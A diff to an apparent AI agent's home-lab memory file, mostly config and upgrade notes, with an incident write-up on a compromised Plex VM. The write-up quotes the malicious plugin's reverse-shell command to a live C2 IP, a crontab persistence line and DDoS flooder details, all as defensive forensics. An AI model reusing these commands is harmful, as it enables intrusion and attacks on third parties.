@@ -32,6 +32,117 @@ Proxima4 (Turion II Neo N40L) experiences intermittent NIC failures where the ne
 
 ---
 
+## Security Incident — DDoS Botnet on VM 109 (Plexus) — 2026-10-20
+
+**Status: RESOLVED — host deleted 2026-10-20 ~22:00.** Containment was achieved by **destroying the
+VM**, not by cleaning it: the `plex` account had a nologin shell, `sudo` on the host required a
+password (so processes could not be killed or the crontab stripped remotely), and no firewall
+tooling (ufw/nft/iptables) was installed. Keith removed VM 109 outright; the host is now
+unreachable and no C2 channel survives with it. Found by the `proxmox-health-3d` cron while
+investigating a 95% CPU reading on Proxima5.
+
+**Verification at removal:** `.gb` (pid 699029) had been running since 04:52:40 with an
+ESTABLISHED TLS session to 45.56.82.212:443; `.uf_guard` (721948) and the UDP flooder (768627,
+800 threads → 152.53.168.44) were live. DNS for `plexus.can.barnabasmusic.com` still resolves to
+192.168.1.241 — stale record to clean up.
+
+**Proxima5 crashed during the removal** (cluster dropped to 4/5 nodes, still quorate). VM 104
+Pegasus and the stopped VMs 105/106 were resident on it. Cause not yet established — possibly
+resource pressure during the removal, or unrelated. **Rebuild of Plexus pending**: new VM, fresh
+Plex install, rotated account token, and the NFS mount unit recreated.
+
+**Host compromised:** VM 109 "Plexus" (Proxmox VM, Proxima5, 192.168.1.241, Debian 13,
+Plex 1.43.3.10828-00f62d37d). Compromised user: `plex` (uid 999, `/usr/sbin/nologin`).
+
+**Chain of compromise**
+1. Malicious Plex "codec" plugin dropped as
+   `.../Plex Media Server/Codecs/4987be2-8e3461d4c82193c06183af3f-linux-x86_64/zz75920.so`
+   (ELF .so, not stripped, mtime 2026-10-20 16:58). Its payload is a **reverse shell**:
+   `/usr/bin/setsid /usr/bin/bash -c 'exec 0<>/dev/tcp/202.78.167.55/10570 1>&0 2>&0;
+   exec /usr/bin/script -qc /bin/bash /dev/null' &` — `script -qc` is used because the `plex`
+   account has a nologin shell, so a PTY is required.
+2. C2/download server: **`202.78.167.55`** — port **10570** (reverse shell), port **8765**
+   (payload host, path `/go_beacon_amd64` or `/go_beacon_arm64`, arch-aware).
+3. Payload 1 — `/tmp/.gb`, 5.7 MB static Go binary ("go_beacon"), C2 channel to
+   **`45.56.82.212:443`** (TLS). Args `la_au599433 tk_la_au512_3211ea` = bot/campaign IDs.
+4. Payload 2 — `/tmp/.uf`, a **UDP flooder** (800 threads, 65000-byte random packets, 300 s
+   bursts) targeting `152.53.168.44` on ports 22,80,443,3000,8080,8084.
+5. Watchdog `/tmp/.uf_guard` re-materialises `.uf` from an embedded base64 blob and restarts it
+   every 5 s (`/tmp/.uf_go` + `/tmp/.uf_cfg` + `/tmp/.uf.pid`).
+6. Persistence: `plex` crontab → `*/1 * * * * pgrep -f [.]gb >/dev/null || nohup /tmp/.gb ... &`
+
+**Detection signature worth remembering:** Proxmox reported VM 109 at only 3.7% CPU while the
+*node* sat at 95%. **VM 109 has no QEMU guest agent**, so guest-internal load is invisible to
+the Proxmox API — the node/CPU gap was the only clue. Inside the guest: load average 238–294,
+`python3` at 350% CPU. For any node pegged well above its guest-reported CPU, check the guest
+directly rather than trusting the Proxmox resource view.
+
+**Blast radius (verified clean):** all other reachable hosts scanned for the payloads and
+processes — proxima, proxima2-5, dockyards, kasm, arya, tg-b, simul, xaviernv, retrobench are
+clean. NFS shares from 192.168.1.8 (`/Data/VIDEO`, `/Data/MP3_Library`, `/Data/GALLERY`) have no
+plex-owned files written since 2026-10-17 — no spread to the media library. No SSH key planted
+for `plex`, no systemd user units. No failed SSH logins in 7 days — access was via the Plex
+plugin, not brute force. 707 `*.jpg` in /tmp are benign Plex thumbnails.
+
+**Open items for Keith:** (1) kill 699029 / 765066 / 721948 + clear the crontab line;
+(2) delete `/tmp/.gb`, `/tmp/.uf*`, `zz75920.so`, upgrade Plex; (3) rotate the Plex account token
+and block 202.78.167.55 / 45.56.82.212 at the firewall; (4) note the cluster has **zero backup
+jobs**, so VM 109 has no restore point.
+
+**Related cluster facts:** `storage/proxima/test` (zfspool, mountpoint /test) is defined in
+/etc/pve/storage.cfg but **no `test` pool exists on any node** — a dead storage entry, shows as
+`inactive`/`unknown` in every status report. Separately, `HA resources: 0` and `Backup jobs: 0`
+cluster-wide. VM 105 (HMC) and VM 106 (ArosOne) on Proxima5 are intentionally stopped.
+
+---
+
+## OpenClaw 2026.10.2 — Model, Config & Plugin Gotchas (2026-10-20)
+
+Durable, repeatable traps hit while switching the default model and running `doctor`/`security audit` on hebei. Each cost real time; each has a one-line fix.
+
+**Model selection (default is now `ollama/minimax-m3.1-flash:cloud`)**
+- **Two independent allow lists.** `agents.defaults.modelPolicy.allow` is not enough — the gateway enforces `agents.entries.*.modelPolicy.allow` for model overrides and rejects with *"Model override … is not allowed for agent main"*. Both lists must carry the new model.
+- **Per-agent override shadows the global default.** `openclaw models set` writes only `agents.defaults`; `agents.entries.main.model.primary` takes precedence for the `main` agent. Set it explicitly with `openclaw config set agents.entries.main.model.primary <model>` (the CLI has no `--agent` flag for `models set`).
+- **Bracket-string config set is rejected.** `openclaw config set 'path=["a","b"]'` → "Invalid path bracket string". Use index form: `openclaw config set 'path[4]' 'value'`.
+- **Cloud-route models are absent from the local catalog.** `minimax-m3.1-flash:cloud` is not in `ollama list` / `/api/tags`, yet `ollama show` resolves it and it runs. `openclaw models set` warns "not in the local model catalog" but still saves.
+- **Probe via `openclaw infer model run --gateway --model <m> --prompt "Reply with exactly: PROVIDER-PROOF-OK"`.** `openclaw agent --agent main --model …` is blocked in this context ("Gateway agent from agent exec would lose inter-session attribution"). Fallback stays `openai/gpt-5.6-terra`.
+
+**Config / security audit** <!-- project: github.com/GeoKM/jarvis-workspace -->
+- **`plugins.allow` is an EXCLUSIVE allowlist** — any plugin id not in the list is disabled at activation (`dist/config-activation-shared-*.mjs`). A minimal list (e.g. `["codex"]`) would disable ollama/telegram/memory-core and break the gateway. Set it to the exact set of currently-enabled plugin ids (44 here: 42 bundled + `codex` + `perplexity`); disabled bundled plugins are deliberately excluded.
+- **The non-secret API-key marker exemption is path-specific.** `isNonSecretApiKeyMarker` applies only to `models.providers.*.apiKey` — *not* to `memory.search.remote.apiKey`. A placeholder value there is still flagged; the only clean fix is `openclaw config unset memory.search.remote.apiKey` (no SecretRef migration — there is nothing to protect). Local ollama at 127.0.0.1:11434 needs no auth header.
+- **`doctor --lint` flags USER.md > 4000 chars** (bootstrap truncation cap) — USER.md is 4550 bytes and should be trimmed.
+- **Startup migrations pending** requires `openclaw doctor --fix` (mutating — needs owner approval).
+- **Gateway memory pressure** (RSS 2.4–2.8 GiB vs 2.21 GiB threshold, 17–19 workers) with recurring "slow SQLite transaction" / "SQLite lock wait failed"; session DB 134M, agent dir 618M. Fix = gateway restart + session pruning. **Compaction failures** on minimax-m3.1-flash:cloud: "summary output budget (6553 tokens) exhausted" → guard cancels, 143-message history left uncompressed.
+- **Dead-lettered delivery queue**: `openclaw health` reported 13 outbound Telegram messages permanently failed (oldest 64d ago) — still open.
+- **Invalid skills are silently skipped.** `skills/aix-system-monitor/SKILL.md` had no YAML frontmatter → "Skipping invalid skill" on every load (the AIX cron still worked because it runs `run-aix-monitor.sh` as a `command` payload, not the skill). Fix = add `name` + `description` frontmatter.
+
+**Skill authoring / Workshop** <!-- project: github.com/GeoKM/jarvis-workspace -->
+- **Workshop publication standard is 10,000 chars.** `os-upgrade-lab-hosts` SKILL.md was 26,768 → restructured to a short procedure (8,855 chars) plus 8 reference files. **One source per meaning** — the first extraction pass left the `pct exec` block and the `shutdown -r now` rule in both SKILL.md and the reference; the reference must point back, not restate. **Never write "see X above"** — it breaks the moment sections move; name the file/section instead. **The frontmatter description is the routing surface** — rewrite it whenever the branches change.
+- The `read` tool refuses a skill file already served whole in the current context ("Skill instructions were already served whole earlier in the current model context") — use `exec sed -n` to re-read it. `progress_card` rejects numeric strings: `limit`/`plan` need real integers and `plan` must be an array.
+
+**Workspace git hygiene** <!-- project: github.com/GeoKM/jarvis-workspace -->
+- 158 stray `collect-metrics.py.bak.*` / `*.broken-fragment.*` files (~924K) plus `__pycache__` were sitting untracked; `.gitignore` now excludes `__pycache__/`, `*.py[co]`, `*.bak.*`, `*.broken-fragment.*` (files left on disk, not deleted).
+- A **fragmented** collector is ~1331 bytes; a working one is 11,063+. `ast.unparse()` round-trips split semicolon-chained statements (`a, l = check(...); all_alerts.extend(a); lines.extend(l)`) into separate statements — literal-text grep counts do not prove call counts.
+- **GitHub auth**: the stored `ghp_` PAT was expired/revoked (401) and all three local SSH keys were rejected. Fixed by `gh auth login` with an **OAuth** token (`gho_…`, scopes: gist, read:org, repo, workflow) in the keyring; `credential.helper = gh auth git-credential` (global). Push to `GeoKM/jarvis-workspace` (public, default branch master) then succeeded.
+
+## Unattended-Upgrades Rollout — No Reboots (2026-10-20)
+
+Scope approved by Keith: non-Proxmox-cluster hosts only. Proxmox cluster nodes (proxima, proxima2-5) stay manual. manifold and Helios excluded. ArosOne ignored. cbm deferred (powered off). **No reboots anywhere.**
+
+- **hebei (gateway, Ubuntu 24.04 noble)** — full config. Custom `20auto-upgrades` with `APT::Periodic::{Update-Package-Lists,Download-Upgradeable-Packages,Unattended-Upgrade,AutocleanInterval,Unattended-Upgrade-Delay}` plus `Unattended-Upgrade::Automatic-Reboot "false"` uncommented. Backup `/var/backups/openclaw-unattended-upgrades/20261020-132427/`.
+- **All others (9 hosts)** — "K path": plain `apt-get install -y unattended-upgrades`, stock conffiles left alone; `Automatic-Reboot` stays commented (package default = false). The package postinst enables the service + timers itself.
+- Host notes: xaviernv = Ubuntu 20.04 focal aarch64 (Jetson), sudo needs a password for file writes; simul = Debian 13 trixie (QEMU VM), `update-notifier-common` has no trixie candidate → replaced by `apt-config-auto-update`; retrobench = Debian 12 bookworm, liquorix 6.12.7-2, u-u 2.9.1+nmu3 already present; LXC/Pi hosts (dockyards, kasm, tg-b, arya, plexus, pidp11) run host/vendor kernels so apt will not replace them; tg-b is Ubuntu 26.04 resolute. **No kernel-blacklist file was written anywhere** — `keith` has no sudoers NOPASSWD for `/etc/apt/apt.conf.d` writes.
+- **Caveat:** on stock config a kernel package *can* enter the upgrade queue on hebei/xaviernv/simul/retrobench. `Automatic-Reboot` is false everywhere, so it installs but does not reboot — it then shows as a `reboot_required` CRITICAL in the Lab Monitor digest until manually rebooted.
+- Rollback (anywhere except hebei): `apt-get purge unattended-upgrades`.
+
+## reboot_required Flag in linux-system-monitor (2026-10-20) <!-- project: github.com/GeoKM/jarvis-workspace -->
+
+- `scripts/collect-metrics.py` computes `reboot_required` (needed/pkgs/reasons/kernel_age_h) from `/var/run/reboot-required{,.pkgs,.reason}` and emits it in the JSON snapshot; `scripts/parse-report.py` adds `check_reboot()` (CRITICAL when needed, else OK with running-kernel age), called once in `main()` after `check_docker`.
+- Both branches verified on hebei: OK (`Reboot OK (running kernel 849.4h)`) and CRITICAL via a synthetic `/var/run/reboot-required` (header flipped, package list rendered, `[CRITICAL] reboot_required = True`); the synthetic flag was removed afterwards.
+- Lesson: `collect-metrics.py` had been truncated to a 41-line fragment in an earlier session and was restored from `collect-metrics.py.bak.20261019-212104` (297-line working version). Many stale `.bak.20261019-212*` fragments exist — worth pruning.
+
+---
+
 ## System Upgrades (2026-09-30)
 
 ### CBM: Debian 12 (Bookworm) → Debian 13 (Trixie)
@@ -69,66 +180,11 @@ TG-B (`tg-b.can.barnabasmusic.com`, `192.168.1.187`) — LXC 107 on proxima3, AM
 | 108 | Simul | proxima | 2048 MiB | running |
 | 109 | Plexus | Proxima5 | 4096 MiB | running |
 
-## Promoted From Short-Term Memory (2026-08-15)
+## Promoted From Short-Term Memory (Condensed 2026-10-20)
 
-<!-- openclaw-memory-promotion:memory:memory/2026-08-10.md:17:17 -->
-- ⬛ Unreachable: xaviernv, cbm, helios — No route to host [score=0.835 recalls=0 avg=0.620 source=memory/2026-08-10.md:17-17]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-10.md:8:10 -->
-- 🔴 CRITICAL: **retrobench**: 23 security packages pending; **proxima–5**: 2 security packages each + high swap (proxima2 worst: 2.7GiB); **proxima3**: also disk 92% used (8% free) [score=0.835 recalls=0 avg=0.620 source=memory/2026-08-10.md:8-10]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-10.md:5:5 -->
-- System Monitoring Snapshot (12:03 AEST): Received from cron session. Critical issues: [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-10.md:5-5]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-10.md:20:23 -->
-- Action Items (from monitoring): Security updates — retrobench (23), proxima cluster (2 each); Memory pressure — proxima2 (2.7GiB swap) worst; Disk cleanup — arya, proxima3 both at 92%; Host connectivity — xaviernv, cbm, helios need physical check [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-10.md:20-23]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-10.md:26:27 -->
-- Notes: Telegram reply to cron session failed (no target chat ID available); Monitoring data captured here for reference [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-10.md:26-27]
+Auto-promoted monitoring snapshots from Aug–Sep 2026, distilled. Raw entries live in `memory/2026-08-*.md` … `memory/2026-09-*.md`; the promotion blocks were re-pushed verbatim on every promotion cycle and pushed MEMORY.md past the 20,000-char bootstrap cap.
 
-## Promoted From Short-Term Memory (2026-08-17)
-
-<!-- openclaw-memory-promotion:memory:memory/2026-08-13.md:13:16 -->
-- Action Items Tracked: Security updates — Proxmox nodes: libhttp-daemon-perl, libssh2-1t64, python3-urllib3 (×5 nodes); retrobench: 2 pkgs; Swap investigation — proxima/proxima2/proxima3/proxima4/plexus all >1GiB; Disk cleanup — arya + proxima3 both at 92%; Reachability — xaviernv/cbm/Helios network diagnostics needed [score=0.836 recalls=0 avg=0.620 source=memory/2026-08-13.md:13-16]
-
-## Promoted From Short-Term Memory (2026-08-18)
-
-<!-- openclaw-memory-promotion:memory:memory/2026-08-13.md:5:8 -->
-- Monitoring Snapshot — 12:00 AEST: **Hosts:** 18 total | 🟢 7 | ⚠️ 2 | 🔴 6 | ⬛ 3; **CRITICAL:** proxima/proxima2/proxima3/proxima4/proxima5 (3 security pkgs + high swap), retrobench (2 security pkgs), proxima3 disk 92%; **WARNINGS:** arya (_export_LibraryPool_Archive 92%), plexus (swap 1.9GiB); **UNREACHABLE:** xaviernv, cbm, Helios (no route to host since previous snapshot) [score=0.835 recalls=0 avg=0.620 source=memory/2026-08-13.md:5-8]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-13.md:9:10 -->
-- Monitoring Snapshot — 12:00 AEST: **OK:** hebei, dockyards, simul, kasm, tg-b, manifold, pidp11; Snapshot delivered to Telegram (msg #3776) [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-13.md:9-10]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-02.md:45:48 -->
-- AIX Midday Monitor Cron — Second Fix (2026-08-05): Converted `agentTurn` payload → `command` payload; Command: `bash /home/keith/.openclaw/workspace/skills/aix-system-monitor/scripts/run-aix-monitor.sh --all 2>&1`; Set `sessionTarget: "isolated"` (command payloads run on gateway, not in session); Set `delivery.mode: "announce"` with `--channel telegram --to 7174833131 --best-effort-deliver` [score=0.802 recalls=0 avg=0.620 source=memory/2026-08-02.md:45-48]
-
-## Promoted From Short-Term Memory (2026-09-01)
-
-<!-- openclaw-memory-promotion:memory:memory/2026-08-28.md:7:10 -->
-- System Monitoring Alert (12:00 AEST): **18 hosts** checked: 6 OK, 2 WARNING, 7 CRITICAL, 3 UNREACHABLE; **CRITICAL**: Security package updates needed on hebei (24), retrobench (10), proxima/proxima2/proxima3/proxima4/proxima5 (22 each); **Swap pressure**: proxima (2.2GiB), proxima2 (2.9GiB), proxima5 (1.5GiB), plexus (2.0GiB); **Disk space**: arya (_export_LibraryPool_Archive) and proxima3 (_PX3_Data0_subvol-101-disk-0) both at 92% used [score=0.834 recalls=0 avg=0.620 source=memory/2026-08-28.md:7-10]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-28.md:11:12 -->
-- System Monitoring Alert (12:00 AEST): **Unreachable**: xaviernv, cbm, Helios — "No route to host"; **Nominal**: dockyards, simul, kasm, tg-b, manifold, pidp11 [score=0.834 recalls=0 avg=0.620 source=memory/2026-08-28.md:11-12]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-28.md:14:14 -->
-- System Monitoring Alert (12:00 AEST): Alert sent to Keith via Telegram (message ID 3886). [score=0.834 recalls=0 avg=0.620 source=memory/2026-08-28.md:14-14]
-
-## Promoted From Short-Term Memory (2026-09-02)
-
-<!-- openclaw-memory-promotion:memory:memory/2026-08-28.md:5:5 -->
-- System Monitoring Alert (12:00 AEST): Received automated monitoring snapshot from cron session: [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-28.md:5-5]
-
-## Promoted From Short-Term Memory (2026-09-04)
-
-<!-- openclaw-memory-promotion:memory:memory/2026-08-31.md:16:17 -->
-- Delta vs 2026-08-28: ⚠️ proxima3 swap alert resolved but disk still at 92%; ✅ All other states stable [score=0.836 recalls=0 avg=0.620 source=memory/2026-08-31.md:16-17]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-31.md:26:29 -->
-- Action Items: **Security updates** — proxima-proxima5 (cluster), retrobench (standalone); **Swap/memory pressure** — proxima2 worst (3.0GiB swap, 53% mem avail); plexus (2.6GiB swap, 13.7% mem avail); proxima4 (1.2GiB swap, 14.9% mem avail); **Disk cleanup** — arya + proxima3 both 92%; **Network diagnostics** — xaviernv, cbm, Helios unreachable; check if they were deliberately shut down or if network/firewall issue [score=0.836 recalls=0 avg=0.620 source=memory/2026-08-31.md:26-29]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-31.md:12:15 -->
-- Delta vs 2026-08-28: ✅ hebei cleared security alerts (was 24 pkgs, now 0 — hebei NOT in critical list); ⚠️ proxima4 now shows high swap (1.2GiB) — was not individually flagged before; ⚠️ plexus swap increased: 2.0GiB → 2.6GiB; ⚠️ proxima2 swap increased: 2.9GiB → 3.0GiB [score=0.815 recalls=0 avg=0.620 source=memory/2026-08-31.md:12-15]
-
-## Promoted From Short-Term Memory (2026-09-05)
-
-<!-- openclaw-memory-promotion:memory:memory/2026-08-31.md:5:8 -->
-- System Monitoring Snapshot — 12:00 AEST: **Hosts:** 18 total | 🟢 7 | ⚠️ 2 | 🔴 6 | ⬛ 3; **CRITICAL:** retrobench (10 security pkgs), proxima/proxima2/proxima3/proxima4/proxima5 (22 security pkgs + swap), retrobench (10 security pkgs); **WARNINGS:** arya (_export_LibraryPool_Archive 92%), plexus (swap 2.6GiB); **UNREACHABLE:** xaviernv, cbm, Helios (persistent — no route since at least 2026-08-13) [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-31.md:5-8]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-31.md:9:9 -->
-- System Monitoring Snapshot — 12:00 AEST: **OK:** hebei, dockyards, simul, kasm, tg-b, manifold, pidp11 [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-31.md:9-9]
-<!-- openclaw-memory-promotion:memory:memory/2026-08-31.md:20:23 -->
-- Persistent Issues (Unchanged): xaviernv/cbm/Helios unreachable — no route to host (since at least 2026-08-13, 18+ days); Security updates not applied to Proxmox nodes (22 pkgs each × 5 nodes); Disk space critical on arya and proxima3 (both 92%); Swap pressure on multiple Proxmox nodes [score=0.803 recalls=0 avg=0.620 source=memory/2026-08-31.md:20-23]
-
-## Promoted From Short-Term Memory (2026-09-07)
-
-<!-- openclaw-memory-promotion:memory:claim:7f59a262220c -->
-- Action Items: **Disk cleanup** — arya + proxima3 both 92% [score=0.763 signals=4 recalls=0 avg=0.620 source=memory/2026-09-02.md:28-28] <!-- trigger: action, items, disk --> <!-- importance: 8 -->
+- **Recurring fleet state (Aug–Sep 2026, since resolved or superseded):** xaviernv / cbm / Helios unreachable ("No route to host", persistent since 2026-08-13); security updates unapplied to proxima–proxima5 (22 pkgs each) and retrobench; swap pressure on proxima (2.2–3.0GiB), proxima2 (2.9–3.0GiB), proxima4, plexus (2.0–2.6GiB); disk at 92% on arya (`_export_LibraryPool_Archive`) and proxima3 (`_PX3_Data0_subvol-101-disk-0`).
+- **Resolved by 2026-09-04:** hebei cleared its security-update backlog (24 pkgs → 0); proxima3 swap alert cleared (disk still 92%).
+- **Standing remediation track:** apply security updates to the Proxmox cluster + retrobench; prune arya and proxima3 storage; diagnose the three unreachable hosts; investigate swap.
+- **AIX midday monitor cron fix (2026-08-05):** payload changed from `agentTurn` → `command` (`bash .../run-aix-monitor.sh --all`), `sessionTarget: "isolated"`, `delivery.mode: "announce"` with `--best-effort-deliver`. <!-- project: github.com/GeoKM/jarvis-workspace -->
